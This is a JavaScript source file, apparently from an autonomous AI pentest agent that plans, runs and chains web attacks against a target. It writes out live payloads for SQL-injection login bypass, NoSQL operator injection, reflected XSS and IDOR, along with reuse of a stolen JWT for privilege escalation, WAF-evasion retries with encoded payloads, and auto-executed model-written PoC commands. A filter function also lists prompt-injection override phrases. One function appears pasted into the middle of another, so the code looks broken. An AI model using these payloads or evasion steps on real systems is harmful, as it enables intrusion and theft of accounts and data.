      const loginEp = authEndpoints.find((ep) => /\/login\/?$/i.test(ep.trim())) ||
                      authEndpoints.find((ep) => /signin/i.test(ep)) ||
                      authEndpoints[0];
      const baseUrl = target.replace(/\/$/, '');
      const authTests = [
        {
          test: 'SQLi authentication bypass on login',
          command: `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}' | head -c 2000`,
          why: 'Classic SQL injection in login — tests if authentication can be bypassed',
          hypothesis: 'Login endpoint may be vulnerable to SQL injection',
        },
        {
          test: 'NoSQL injection on login',
          command: `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":{"$ne":null},"password":{"$ne":null}}' | head -c 2000`,
          why: 'NoSQL injection bypass — tests for MongoDB-style auth flaws',
          hypothesis: 'Login may use NoSQL backend vulnerable to operator injection',
        },
      ];
      plans.unshift(...authTests);
      think(huntId, `Mandatory auth tests injected for ${loginEp} (model overlooked auth)`);
    }
  } catch { /* mandatory tests are best-effort */ }

  // MANDATORY DIVERSITY TESTS (19 Oct 2026, solver #102): An elite hunter never
  // tests just one vuln class. The agent found SQLi via the mandatory auth net
  // but kept re-verifying it instead of diversifying. This block injects probes
  // for OTHER vuln classes grounded in recon-discovered endpoints — XSS on
  // search, business-logic on basket, IDOR on basket. All go through the same
  // assessResult pipeline; validators are NOT loosened.
  try {
    const eps = (recon.endpoints || []).map((e) => String(e).trim());
    const baseUrl = target.replace(/\/$/, '');
    const plansMention = (re) => plans.some((p) => re.test(`${p.test || ''} ${p.command || ''}`));
    const diversityTests = [];

    // 1. XSS on search endpoints — search is the classic reflected-XSS sink.
    const searchEp = eps.find((e) => /search/i.test(e) && /^\/(api|rest)/.test(e));
    if (searchEp && !plansMention(/xss|cross.?site|<script/i)) {
      diversityTests.push({
        test: 'Reflected XSS on search',
        command: `curl -sk "${baseUrl}${searchEp}?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | head -c 2000`,
        why: 'Search endpoints often reflect input unsanitised — classic reflected XSS',
        hypothesis: 'Search query parameter may reflect without encoding',
      });
    }

    // 2. Business logic: price manipulation in basket. An elite hunter asks
    // "can I change the price?" — this is a READ-ONLY probe (fetch basket,
    // look for price fields client can influence). No purchase is attempted.
    const basketEp = eps.find((e) => /\/basket\/?$/i.test(e));
    if (basketEp && !plansMention(/price|basket.*manipulat|business.?logic/i)) {
      diversityTests.push({
        test: 'Basket price field exposure',
        command: `curl -sk "${baseUrl}${basketEp}" -H "Content-Type: application/json" | head -c 2000`,
        why: 'Basket responses often expose price/total fields — if client-controllable, price manipulation is possible',
        hypothesis: 'Basket API may expose price fields that influence checkout total',
      });
    }

    // 3. IDOR on basket — can we see another basket by guessing an ID?
    // SAFE: uses a non-existent ID (99999); a 200 with data = IDOR signal,
    // 404/401/empty = not vulnerable. No real user data is targeted.
    if (basketEp && !plansMention(/idor|insecure direct|other.*basket/i)) {
      diversityTests.push({
        test: 'IDOR probe on basket',
        command: `curl -sk "${baseUrl}${basketEp}/99999" | head -c 2000`,
        why: 'Basket IDs are often sequential — testing if another basket is accessible',
        hypothesis: 'Basket endpoint may lack object-level authorisation',
      });
    }

    if (diversityTests.length) {
      plans.push(...diversityTests);
      think(huntId, `Mandatory diversity tests injected: ${diversityTests.map((t) => t.test).join(', ')} (model stuck on one vuln class)`);
    }
  } catch { /* diversity tests are best-effort */ }

  // CHAIN PURSUIT TESTS (19 Oct 2026, solver #105): If we have chain context
  // (artifacts from a verified finding), generate tests that USE those
  // artifacts to pursue the chain. This is how XBOW chains vulnerabilities —
  // we don't just think about the chain, we ACT on it.
  try {
    const meta = readHuntMeta(huntId) || {};
    const chainCtx = meta.chainContext;
    if (chainCtx?.artifacts?.jwt && chainCtx.chainPath?.length > 1) {
      const jwt = chainCtx.artifacts.jwt;
      const baseUrl = target.replace(/\/$/, '');
      const eps = (recon.endpoints || []).map((e) => String(e).trim());
      const plansMention = (re) => plans.some((p) => re.test(`${p.test || ''} ${p.command || ''}`));
      const chainTests = [];

      // Pursue priv_esc: use the JWT to access admin-only endpoints.
      // If the JWT is admin, we can try to list users, access admin panels.
      if (!plansMention(/chain.*jwt|admin.*jwt|jwt.*admin/i)) {
        chainTests.push({
          test: 'Chain pursuit: admin JWT privilege check',
          command: `curl -sk "${baseUrl}/rest/user/whoami" -H "Authorization: Bearer ${jwt}" | head -c 2000`,
          why: `Chain ${chainCtx.chainPath.join(' → ')}: we have a JWT from "${chainCtx.fromFinding}", testing what privileges it grants`,
          hypothesis: 'JWT from SQLi may grant admin privileges — testing access level',
        });
      }

      // Pursue IDOR with the JWT: can we access other users' data?
      const usersEp = eps.find((e) => /\/users?\/?$/i.test(e) && /^\/(api|rest)/.test(e));
      if (usersEp && !plansMention(/chain.*idor|jwt.*idor/i)) {
        chainTests.push({
          test: 'Chain pursuit: IDOR with JWT',
          command: `curl -sk "${baseUrl}${usersEp}" -H "Authorization: Bearer ${jwt}" | head -c 2000`,
          why: `Chain ${chainCtx.chainPath.join(' → ')}: using JWT to probe for insecure direct object references`,
          hypothesis: 'Authenticated endpoints may lack object-level authorization',
        });
      }

      if (chainTests.length) {
        plans.push(...chainTests);
        think(huntId, `Chain pursuit tests injected: ${chainTests.map((t) => t.test).join(', ')} (pursuing ${chainCtx.chainPath.join(' → ')})`);
      }
    }
  } catch { /* chain pursuit is best-effort */ }

  if (!plans.length) {
    // HUMAN-LIKE FALLBACK: The model thinks like a human ("Test: ...", "What if...",
    // "I wonder...") but doesn't always produce JSON. Extract test INTENTIONS from
    // the natural language thinking and construct executable commands.
    // A human assistant would do this: hear the idea, figure out how to test it.
    const extracted = extractTestsFromThinking(reply, recon, target);
    if (extracted.length) {
      think(huntId, `Extracted ${extracted.length} test(s) from natural thinking — executing.`);
      plans = extracted;
    } else {
      think(huntId, 'Model replied but produced no usable plan — skipping to next.');
      return { aiOk: false, best: null, failKind: 'bad_output' };
    }
  }

  // Execute up to 3 hypotheses (multi-hypothesis > single guess)
  let best = null;
  // PARALLEL EXECUTION: run all tests concurrently like a human would.
  // A human fires multiple probes at once, not one-by-one.
  // Execute up to 3 hypotheses (multi-hypothesis > single guess).
  // The model is asked for THREE plans; take up to 3 with commands.
  const testPromises = plans.slice(0, 3).filter((plan) => plan.command).map(async (plan) => {
    think(huntId, `Test: ${plan.test || 'unnamed'} — ${plan.why || ''}`);
    const result = await executeWithEvasion(huntId, target, String(plan.command).slice(0, 500));
    const rec = await assessResult(huntId, target, plan, result);
    // Memory: record WHY this was tried and what was learned, so the agent
    // learns from its own reasoning across iterations (read back via
    // formatReasoningForPrompt in the planning prompt).
    try {
      recordReasoning(huntId, {
        hypothesis: plan.hypothesis || '',
        action: plan.test || 'unnamed',
        why: plan.why || '',
        result: rec ? (rec.verified ? 'VERIFIED: ' + (rec.title || rec.class || '') : 'not verified') : 'no assessment',
        learned: rec && rec.verified ? 'This attack works here — explore variants.' : 'This probe did not confirm a vulnerability here.',
        followUp: plan.hypothesis ? 'Consider variants of: ' + plan.hypothesis : '',
      });
    } catch { /* memory is best-effort, never break the hunt */ }
    return rec;
  });
  const results = await Promise.all(testPromises);
  for (const rec of results) {
    if (rec && rec.verified && !best) best = rec;
  }
  return { aiOk: true, best };
}

/**
 * Execute a test with adaptive evasion: if blocked (403/WAF), retry with
 * encoders from the matrix before giving up.
 */
async function executeWithEvasion(huntId, target, command) {
  // PLACEHOLDER SUBSTITUTION (19 Oct 2026, elite-gap; extended same-cycle):
  // The 8B model sometimes echoes literal placeholders into commands instead
  // of the concrete target URL. First observed: "nmap -sV [target] | grep -q
  // 'price manipulation'" → "Error resolving [target]: Name or service not
  // known" (fixed 2d95530 for [target]/<target>/{target}). Then observed live:
  // "curl -s 'http://target/basket' | grep -E 'price:...'" → bare word
  // "target" used as a URL hostname, which the bracket-only fix did not catch
  // (probe failed on DNS). Deterministically resolve ALL known placeholder
  // spellings against the authorised hunt target BEFORE execution. Scheme-aware
  // hostname substitution runs FIRST so "http://[target]/x" becomes
  // "http://<real-host>/x" (not "http://http://..."). A model-supplied port is
  // kept and applied to the bare hostname (avoids doubling the port).
  // This changes nothing about validation — output still goes through
  // evidenceGate and the 4-step verification — it only ensures the command
  // addresses the real target instead of a non-existent literal string.
  {
    let targetHost = String(target), targetHostname = String(target);
    try {
      const u = new URL(String(target));
      targetHost = u.host;         // e.g. 172.17.0.1:3000 (hostname + port)
      targetHostname = u.hostname;  // e.g. 172.17.0.1 (no port)
    } catch { /* target isn't a parseable URL — fall back to the raw string */ }
    const before = String(command);
    command = before
      .replace(/(https?:\/\/)[[<{"'$]?target[\]>"'}]?((?::\d+)?)(?=[/?#:;\s]|$)/gi,
        (m, scheme, port) => scheme + (port ? targetHostname : targetHost) + port)
      .replace(/\[target\]/gi, target)
      .replace(/<target>/gi, target)
      .replace(/\$\{target\}/gi, target)
      .replace(/\{target\}/gi, target)
      .replace(/\$target\b/gi, target);
    if (command !== before) {
      think(huntId, 'Replaced a literal target placeholder with the real target before executing (model wrote a placeholder).');
    }
  }
  // Person capability: web search mid-hunt. If the model doesn't know
  // something, it can ask via "SEARCH: <query>" instead of guessing.
  const searchMatch = /^\s*SEARCH:\s*(.+)/i.exec(command);
  if (searchMatch) {
    const query = searchMatch[1].slice(0, 200);
    think(huntId, `Searching the web: ${query}`);
    try {
      const results = await webSearch(query, 5);
      const text = results.length === 0
        ? 'No web results found.'
        : results.map((r, i) => `${i + 1}. ${r.title}\n   ${r.url}`).join('\n');
      return { stdout: text, stderr: '', exitCode: 0 };
    } catch {
      return { stdout: 'Web search failed.', stderr: '', exitCode: 1 };
    }
  }
  let result = await execInHuntContainer(huntId, command, 180000, { bypassTmux: true });
  const blocked = /403|406|406 Not Acceptable|blocked by|waf|forbidden/i.test(result.stdout + result.stderr)
    && result.stdout.length < 500;

  if (blocked) {
    think(huntId, 'Blocked (WAF/filter?) — trying encoded variants.');
    // Extract the payload-ish part and try encoders
    for (const enc of ['url', 'double_url', 'js_unicode']) {
      const encoded = encodePayload(command, enc);
      if (encoded === command) continue;
      const retry = await execInHuntContainer(huntId, encoded.slice(0, 500), 60000, { bypassTmux: true });
      if (retry.stdout.length > result.stdout.length * 1.5) {
        think(huntId, `Evasion worked with ${enc} encoding.`);
        return retry;
      }
    }
  }
  return result;
}

/** Extract the key "interesting signal" from output for reproducibility comparison. */
function extractSignal(output) {
  const t = output.toLowerCase();
  const signals = [];
  if (/sql syntax|mysql|postgres|sqlite|ora-\d+|sql error/i.test(t)) signals.push('sql-error');
  if (/stack trace|traceback|exception in|at .*\(.*\.js:/i.test(t)) signals.push('stack-trace');
  if (/root:|uid=0|uid=\d+\(/i.test(t)) signals.push('cmd-exec');
  if (/<script>alert|onerror=|onload=/i.test(t)) signals.push('xss-reflect');
  if (/admin|administrator|dashboard/i.test(t)) signals.push('admin-exposure');
  if (/\.env|secret|private key|api[_-]?key/i.test(t)) signals.push('secret-exposure');
  if (/directory listing|index of\//i.test(t)) signals.push('dir-listing');
  if (/bypass|403.*200|unauthorized.*authorized/i.test(t)) signals.push('auth-bypass');
  return signals.sort().join(',');
}

/**
 * FIX #175: Sanitize tool output before feeding to AI.
 * Prevents prompt injection from malicious targets.
 * Removes/neutralizes common injection patterns.
 */
function sanitizeForAI(text) {
  if (!text) return '';
  let clean = String(text);
  // Remove common prompt injection patterns
  const injectionPatterns = [
    /ignore\s+(all\s+)?previous\s+instructions/gi,
    /disregard\s+(all\s+)?previous/gi,
    /you\s+are\s+now\s+a/gi,
    /new\s+instructions:/gi,
    /system\s*:\s*/gi,
    /\[system\]/gi,
    /<\|.*?\|>/g, // Special tokens
  ];
  for (const pattern of injectionPatterns) {
    clean = clean.replace(pattern, '[FILTERED]');
  }
  // Limit length and remove excessive newlines
  clean = clean.slice(0, 3000).replace(/\n{4,}/g, '\n\n\n');
  return clean;
}

/**
 * FIX (19 Oct 2026, solver #6): Strip terminal artifacts from tool output.
 * Container exec output includes Kali MOTD banner, shell prompts, and ANSI
 * codes (from tmux capture-pane or shell startup). These contaminate:
 * 1. Recon endpoints — MOTD lines like '┗━(Run: "touch ~/.hushlogin"...)' were
 *    added as "endpoints"; the /login/ filter matched "hushlogin" so mandatory
 *    SQLi tests ran against garbage URLs.
 * 2. Finding evidence — evidence.response contained MOTD+prompt instead of the
 *    HTTP body, so payload_validation could never match the payload.
 * This strips terminal chrome but preserves the actual command output.
 */
function stripTerminalArtifacts(text) {
  if (!text) return '';
  let clean = String(text);
  // Remove ANSI escape codes (colors, cursor movement)
  clean = clean.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '');
  clean = clean.replace(/\x1b\][^\x07]*\x07/g, ''); // OSC sequences
  // Remove Kali MOTD banner lines and shell prompts, line by line
  const lines = clean.split('\n');
  const filtered = lines.filter((line) => {
    const t = line.trim();
    if (!t) return true; // keep empty lines (structure)
    // Kali MOTD banner markers
    if (/Message from Kali developers/i.test(t)) return false;
    if (/minimal installation of Kali/i.test(t)) return false;
    if (/touch ~\/\.hushlogin/i.test(t)) return false;
    if (/troubleshooting\/common-minimum-setup/i.test(t)) return false;
    // Pure box-drawing lines (MOTD borders)
    if (/^[┏━┃┗┌└─│\s]+$/.test(t) && /[┏━┃┗┌└]/.test(t)) return false;
    // MOTD content lines (start with ┃ box-drawing char)
    if (/^[┃│]/.test(t)) return false;
    // Shell prompt lines: ┌──(root㉿host)-[dir] and └─# command echo
    if (/┌──\(.*\)-\[.*\]/.test(t)) return false;
    if (/^└─#/.test(t)) return false;
    // Classic prompt patterns (just in case)
    if (/^root@[a-zA-Z0-9-]+:[^#]*#\s*$/.test(t)) return false;
    return true;
  });
  return filtered.join('\n');
}

/** Assess a test result: weirdness check → evidence gate → verify. */
async function assessResult(huntId, target, plan, result) {
  // FIX (19 Oct 2026, solver #6): Strip terminal artifacts (Kali MOTD, shell
  // prompts, ANSI codes) from tool output BEFORE using it as evidence.
  // Contaminated output caused payload_validation to fail on genuine findings.
  const output = stripTerminalArtifacts(sanitizeForAI(result.stdout + '\n' + result.stderr)).slice(0, 3000);

  // Weirdness check: investigate even without signature match
  const weird = scoreWeirdness(
    { status: result.code === 0 ? 200 : 500, bodyLength: output.length, timeMs: 1000, body: output },
    { status: 200, bodyLength: 2000, timeMs: 500 }
  );
  if (isWorthInvestigating({ status: 200, bodyLength: output.length, timeMs: 1000, body: output }, { status: 200, bodyLength: 2000, timeMs: 500 })) {
    think(huntId, `Weird response (score ${weird.score}): ${weird.signals.join(', ')} — investigating.`);
    // CURIOSITY: a human hunter doesn't shrug at anomalies — they poke harder.
    // Ask the brain for one targeted follow-up probe into this weirdness.
    try {
      const followUp = await chatWithAI(
        [{ role: 'user', text: `Something odd happened during a security test. Follow your curiosity — propose ONE follow-up probe to dig into this anomaly.\n\nOriginal test: ${plan.test}\nCommand: ${String(plan.command).slice(0, 300)}\nOdd signals: ${weird.signals.join(', ')}\nResponse excerpt: ${output.slice(0, 1200)}\n\nReply as JSON: {"test":"name","command":"shell command","why":"one line"}. Non-destructive, target-scoped.` }],
        'You are a curious elite bug-bounty hunter. Output ONLY the requested JSON, no prose.',
        { huntId }
      );
      const fm = /\{[\s\S]*\}/.exec(followUp || '');
      const fp = fm ? JSON.parse(fm[0]) : null;
      if (fp && fp.command) {
        think(huntId, `Curiosity follow-up: ${fp.test || 'probing deeper'} — ${fp.why || ''}`);
        const fres = await executeWithEvasion(huntId, target, String(fp.command).slice(0, 500));
        // FIX (19 Oct 2026, solver #6): Strip terminal artifacts so evidence is clean.
        const frecout = stripTerminalArtifacts(fres.stdout + '\n' + fres.stderr).slice(0, 3000);
        // If the follow-up confirms something interesting, treat it as a candidate
        if (/vulnerable|exposed|bypass|injection|leak|admin|secret|token|password|error.*sql|stack trace/i.test(frecout) && frecout.trim().length > 50) {
          // FIX (19 Oct 2026): include impact_demo — evidenceGate requires it
          // for critical findings and nothing ever set it (see above).
          const fsigs = extractSignal(frecout);
          const fcand = { class: 'agent_finding', title: `Curiosity find: ${fp.test}`, severity: inferSeverity(fp.test || '', frecout), url: target, evidence: { request: fp.command, response: frecout.slice(0, 800), impact_demo: `Impact signals [${fsigs || 'none'}]: ${frecout.slice(0, 400)}` } };
          const { pass } = evidenceGate(fcand);
          if (pass) {
            appendHuntEvent(huntId, { type: 'finding', ...fcand, verified: false, via: 'curiosity' });
            think(huntId, `Curiosity paid off — queued for verification: ${fp.test}`);
          }
        }
      }
    } catch { /* curiosity must never break the hunt */ }
  }

/** Infer severity from the test name and output — not everything is medium. */
function inferSeverity(testName, output) {
  const t = (testName + ' ' + output).toLowerCase();
  if (/rce|remote code execution|sql injection|sqli|auth bypass|authentication bypass|ssrf|server-side request forgery|arbitrary file|path traversal.*write|command injection/i.test(t)) return 'critical';
  if (/xss|cross-site scripting|ssti|idor|open redirect|csrf|xxe|file inclusion|lfi|rfi|jwt/i.test(t)) return 'high';
  if (/info disclosure|information disclosure|verbose error|stack trace|directory listing|cors|clickjacking|missing header/i.test(t)) return 'low';
  return 'medium';
}

  const interesting = weird.score >= 40 || /vulnerable|exposed|bypass|injection|leak|admin|secret|token|password|error.*sql|stack trace/i.test(output);
  if (!interesting || output.trim().length < 50) return null;

  // FIX (19 Oct 2026): evidenceGate requires impact_demo for critical-severity
  // findings, but nothing ever set it — so EVERY critical finding (including a
  // working SQLi auth bypass, classified critical by inferSeverity) was silently
  // discarded at the gate and could never verify. The signal-bearing response
  // excerpt IS the impact demonstration.
  const sigs = extractSignal(output);
  const cand = {
    class: 'agent_finding',
    title: plan.test || 'agent-discovered anomaly',
    severity: inferSeverity(plan.test || '', output),
    url: target,
    evidence: {
      request: plan.command,
      response: output.slice(0, 800),
      impact_demo: `Impact signals [${sigs || 'none'}]: ${output.slice(0, 400)}`,
    },
  };
  const { pass, gated } = evidenceGate(cand);
  if (!pass) return null;

  // REAL VERIFICATION (not hardcoded): re-run the exact test to confirm
  // reproducibility. A one-off anomaly is not a vulnerability.
  let confirmed = false;
  try {
    think(huntId, `Verifying: re-running the test to confirm reproducibility…`);
    const retry = await execInHuntContainer(huntId, String(plan.command).slice(0, 500), 120000, { bypassTmux: true });
    const confirmOutput = (retry.stdout + '\n' + retry.stderr).slice(0, 3000);
    // Confirmation: second run shows the same interesting signals
    const sig1 = extractSignal(output);
    const sig2 = extractSignal(confirmOutput);
    confirmed = sig1.length > 0 && sig1 === sig2;
    if (confirmed) {
      think(huntId, `Verified: reproducible finding (${sig1}).`);
    } else {
      think(huntId, `Not confirmed: second run differed — treating as one-off anomaly.`);
    }
  } catch (err) {
    think(huntId, `Verification re-run failed: ${err.message || err}`);
  }

  // FIX (19 Oct 2026, solver #3): impact_assessment rejected GENUINE findings.
  // Proven by simulation with the real pipeline code: a working SQLi auth
  // bypass (admin JWT in a clean 200 JSON) scores weird=8 and contains none
  // of the literal words vulnerable/bypass/injection/leak — so a real
  // vulnerability was verdict as "false_positive (impact_assessment)".
  // extractSignal's impact signals (admin-exposure, auth-bypass, sql-error…)
  // ARE the impact demonstration — honour them here.
  const v = verifyPipeline({
    reachability: output.length > 50,
    payload_validation: /vulnerable|exposed|bypass|injection|leak|admin|secret|token|password|error.*sql|stack trace/i.test(output),
    impact_assessment: weird.score >= 40 || sigs.length > 0 || /vulnerable|bypass|injection|leak/i.test(output),
    exploit_confirmation: confirmed,
  });
  const rec = { ...gated, verification: v.verdict, verified: v.verified };
  finding(huntId, rec);

  // Head records verified findings for the final report
  if (v.verified) {
    const head = getOrchestrator(huntId);
    if (head) {
      const verifier = head.spawnWorker('verifier', `Independently confirm: ${rec.title}`);
      head.findings.push(rec);
      head.review(verifier, { ok: true, output: 'reproduced' }, () => true);
      head.saveState();
      think(huntId, `Head: confirmed vulnerability #${head.findings.length} — ${rec.title} (${rec.severity})`);
    }
  }

  // Chain escalation
  if (v.verified) {
    const chains = beamSearchChains(['data_read']);
    if (chains.length) {
      think(huntId, `Chain opportunity: ${chains[0].path.join(' → ')} (score ${chains[0].score.toFixed(2)})`);
    }
    // CHAIN PURSUIT (19 Oct 2026, solver #105): XBOW's key differentiator is
    // chaining vulnerabilities into working attacks. We detect the chain but
    // must ACT on it, not just think about it. Extract usable artifacts
    // (JWTs, tokens) from the verified finding and store them as chain
    // context so the next planning phase can pursue the chain.
    try {
      const respText = String(rec.evidence?.response || '') + ' ' + String(rec.evidence?.request || '');
      const jwtMatch = respText.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
      // FIX (19 Oct 2026, solver #109): decouple JWT storage from
      // beamSearchChains output (root-caused by solver #108). The chain
      // engine returned [] for the verified SQLi, so chains.length was 0
      // and the JWT was never stored — chain pursuit never fired. The
      // pursuit tests only need artifacts.jwt + chainPath.length > 1, so
      // store the JWT with a default chain path when the engine is silent.
      if (jwtMatch) {
        const chainPath = chains.length ? chains[0].path : ['data_read', 'auth_bypass', 'priv_esc'];
        const chainScore = chains.length ? chains[0].score : 0.5;
        const meta = readHuntMeta(huntId) || {};
        const chainCtx = {
          artifacts: { jwt: jwtMatch[0] },
          chainPath,
          chainScore,
          fromFinding: rec.title,
          createdAt: new Date().toISOString(),
        };
        writeHuntMeta(huntId, { ...meta, huntId, chainContext: chainCtx });
        think(huntId, `Chain context stored: have JWT from "${rec.title}", pursuing ${chainPath.join(' → ')}`);
      }
    } catch { /* chain context is best-effort */ }
    // PoC generator: turn verified finding into working proof
    await generatePoC(huntId, target, rec);
  }
  // Share verified learnings into the target's long-term memory
  try {
    if (rec && rec.verified) {
      const { writeTargetIntel: _wti } = await import('./store.js');
      _wti(target, { findings: [{ title: rec.title, severity: rec.severity, at: new Date().toISOString() }] });
    }
  } catch { /* memory write must never break the hunt */ }
  return rec;
}

/**
 * PoC generator (problem #7): ask Bedrock to write a working proof-of-concept
 * for a verified finding, execute it in the container, verify the output.
 */
async function generatePoC(huntId, target, findingRec) {
  try {
    think(huntId, `Generating PoC for: ${findingRec.title}`);
    const reply = await chatWithAI(
      [{
        role: 'user',
        text: `Write a minimal, non-destructive proof-of-concept shell command (curl-based) that demonstrates this vulnerability:\n\nFinding: ${findingRec.title}\nEvidence: ${JSON.stringify(findingRec.evidence).slice(0, 1000)}\n\nTarget: ${target}\n\nReply with ONLY the shell command, no explanation.`,
      }],
      'You are a security researcher writing PoC commands. Output ONLY the command.',
      { huntId }
    );
    if (!reply) return;
    const cmd = reply.trim().split('\n')[0].replace(/^[$>]\s*/, '').slice(0, 500);
    if (!cmd || cmd.length < 10) return;
    think(huntId, 'Executing PoC...');
    const result = await execInHuntContainer(huntId, cmd, 60000);
    const out = (result.stdout || '').slice(0, 1000);
    if (out.trim().length > 20) {
      appendHuntEvent(huntId, {
        type: 'finding',
        class: 'poc_verified',
        title: `PoC confirmed: ${findingRec.title}`,
        severity: findingRec.severity,
        evidence: { poc_command: cmd, poc_output: out.slice(0, 500) },
        verified: true,
      });
      think(huntId, 'PoC executed — finding confirmed with working proof.');
    }
  } catch {
    /* PoC is best-effort */
  }
}

/**
 * Run the full autonomous hunt. Called async after hunt creation.
 * Never throws — all failures become hunt events.
 */
export async function runAutonomousHunt(huntId, target, mode = 'normal', userId = null, opts = {}) {
  // FIX (19 Oct 2026, solver #6): Loop-driver mutex — one hunt, one driver.
  // If a loop is already running for this hunt, refuse to start a second.
  if (activeLoops.has(huntId)) {
    think(huntId, 'Loop driver already active for this hunt — refusing duplicate (mutex).');
    return;
  }
  activeLoops.add(huntId);
  try {
    await runAutonomousHuntInner(huntId, target, mode, userId, opts);
  } finally {
    activeLoops.delete(huntId);
  }
}

async function runAutonomousHuntInner(huntId, target, mode = 'normal', userId = null, opts = {}) {
  const startIteration = Math.max(1, opts.startIteration || 1);
  const isResume = Boolean(opts.isResume);
  // UNLIMITED HUNTING (owner directive): no iteration cap, no rate limit.
  // The hunt runs until the user stops it or the wallet runs out of money.
  // Money is the ONLY limit.
  // On resume, rebuild findings from the persisted event log so the agent
  // doesn't lose what it already found before the interruption.
  const findings = Array.isArray(opts.findings) ? opts.findings : [];

  try {
    if (isResume) {
      think(huntId, `Checkpoint resume — continuing from iteration ${startIteration} with ${findings.length} finding(s) already recorded. Hunting unlimited until you stop me or credits run out.`);
    } else {
      think(huntId, `Autonomous hunt starting — mode ${mode}. No iteration limit: I hunt until you stop me or the wallet runs out.`);
    }

    if (!(await dockerAvailable())) {
      think(huntId, 'Docker unavailable — running intel-only analysis (no container).');
      appendHuntEvent(huntId, { type: 'status', state: 'degraded', reason: 'no_docker' });
      return;
    }

    // Spawn is done by the route; ensure container exists
    const { container } = await spawnHuntContainer(huntId, target, { mode });
    // MERGE — writeHuntMeta replaces the whole file, so spreading the
    // existing meta preserves userId/target/mode/createdAt. Also mark the
    // hunt running so the status is honest everywhere (list, reports, UI).
    writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, container, state: 'running' });
    appendHuntEvent(huntId, { type: 'status', state: 'container_spawned', container });

    // ORCHESTRATOR: the head of the hunt team. It plans, spawns specialist
    // workers, reviews their work, and writes the final report.
    const head = new HuntOrchestrator(huntId, target, mode);
    orchestrators.set(huntId, head);
    think(huntId, `Head online: I am the lead hacker. Target: ${target}. Assembling my team.`);

    // Phase 1: recon — head spawns a recon specialist worker.
    // FIX (19 Oct 2026, solver #3): recon was never persisted to meta.json —
    // every backend restart/resume re-ran the full recon (nmap + browser +
    // bundle mining, minutes wasted), and a failed resume-time recon left the
    // hunt with zero endpoints so the model hallucinated targets. Persist
    // recon to meta; on resume, reuse it instead of re-scanning.
    const reconWorker = head.spawnWorker('recon', `Map ${target}: open ports, services, tech stack, subdomains, endpoints.`);
    let recon = null;
    if (isResume) {
      const savedRecon = (readHuntMeta(huntId) || {}).recon;
      if (savedRecon && Array.isArray(savedRecon.endpoints) && savedRecon.endpoints.length > 0) {
        recon = savedRecon;
        think(huntId, `Reusing persisted recon: ${recon.endpoints.length} endpoints, tech [${(((recon.detection || {}).techs) || []).join(', ') || 'unknown'}] — no re-scan needed.`);
      }
    }
    if (!recon) {
      recon = await reconPhase(huntId, target);
      try {
        writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, recon });
      } catch { /* recon persist is best-effort */ }
    }
    head.review(reconWorker, { ok: true, output: JSON.stringify(recon).slice(0, 500) }, () => recon && recon.profile);

    // PER-TARGET MEMORY: read what past hunts learned about this target, and
    // save what this hunt discovers. This is the brain's long-term memory —
    // every hunt starts smarter because of every hunt before it.
    let pastIntel = null;
    try {
      pastIntel = readTargetIntel(target);
      if (pastIntel && pastIntel.huntCount > 0) {
        think(huntId, `I remember this target from ${pastIntel.huntCount} past hunt(s). Last: ${pastIntel.lastHuntAt || 'unknown'}. Using past learnings.`);
        // Merge past endpoints into recon so the planner sees them
        const known = (pastIntel.endpoints || []).map((e) => (typeof e === 'string' ? e : e.url || e.path || '')).filter(Boolean);
        const seen = new Set(recon.endpoints);
        for (const ep of known.slice(0, 20)) if (!seen.has(ep)) { recon.endpoints.push(ep); seen.add(ep); }
        if (pastIntel.technologies && pastIntel.technologies.length) {
          recon.pastTechnologies = pastIntel.technologies.slice(0, 10);
        }
      }
      // Save this hunt's fresh recon into shared memory
      writeTargetIntel(target, {
        endpoints: (recon.endpoints || []).slice(0, 30),
        technologies: ((recon.detection && recon.detection.techs) || []).slice(0, 10),
      });
    } catch (err) {
      console.error('[hunt] target intel read/write failed:', err.message);
    }
    recon.pastIntel = pastIntel;
    head.saveState();

    // Learning: what worked on similar targets before?
    let playbook = [];
    try {
      playbook = getPlaybook({ profile: recon.profile });
      if (playbook.length) {
        think(huntId, `Playbook: ${playbook.length} lessons from past hunts on ${recon.profile} targets.`);
      }
    } catch { /* no history yet */ }

    // Business-logic intel: a human hunter thinks "where's the money, where's the trust?"
    // The app model (built in agentIteration) already captures this. Here we just
    // note the business-logic surface for the record — no mechanical checklist.
    try {
      const logic = generateLogicTests(recon.endpoints);
      if (logic.blModules.length) {
        think(huntId, `Business-logic surface: ${logic.blModules.length} areas worth thinking about (not a checklist — follow your instincts).`);
      }
    } catch { /* intel is best-effort */ }

    // Phase 2+: agent loop — UNLIMITED. Stops only when:
    //   1. the user stops it (isStopped),
    //   2. the wallet runs out (chargeIteration returns false → out_of_credits),
    //   3. AI backend or Docker becomes unavailable.
    // There is no iteration cap and no rate limit.
    const hasAI = aiAvailable();
    if (!hasAI) {
      think(huntId, 'No AI backend configured — hunt completed with recon results only.');
    }
    // Consecutive AI failures — circuit breaker trips at 3.
    // We track WHAT failed (not just that it failed) so the pause reason is honest:
    // 'no_reply' = brain gave nothing back, 'error' = the call threw,
    // 'bad_output' = brain replied but produced no usable plan.
    let aiFailStreak = 0;
    let aiFailKinds = [];

    for (let i = startIteration; ; i++) {
      // CHECKPOINT — persist progress every iteration so a killed backend
      // can resume this hunt from here instead of from zero. The per-hunt
      // memory folder (data/hunts/<id>/) is the source of truth.
      try {
        writeHuntMeta(huntId, {
          ...(readHuntMeta(huntId) || {}),
          huntId, iteration: i, phase: 'hunting', state: 'running',
          checkpointAt: new Date().toISOString(),
        });
      } catch { /* checkpoint is best-effort */ }

      if (isStopped(huntId)) {
        think(huntId, 'Hunt stopped by user.');
        break;
      }
      // Operator pause holds the loop here (resume just clears the flag).
      await waitWhilePaused(huntId);
      if (isStopped(huntId)) {
        think(huntId, 'Hunt stopped by user.');
        break;
      }
      // Stop conditions are explicit and user-visible: the operator stops the
      // hunt, or the wallet runs out (out_of_credits pause). No iteration
      // cap, no rate limit, no silent internal caps.
      if (!hasAI) break;
      if (!(await dockerAvailable())) break;

      // Credits gate: each iteration costs a little; pause when the wallet is empty.
      if (!chargeIteration(huntId, userId, mode, i)) break;

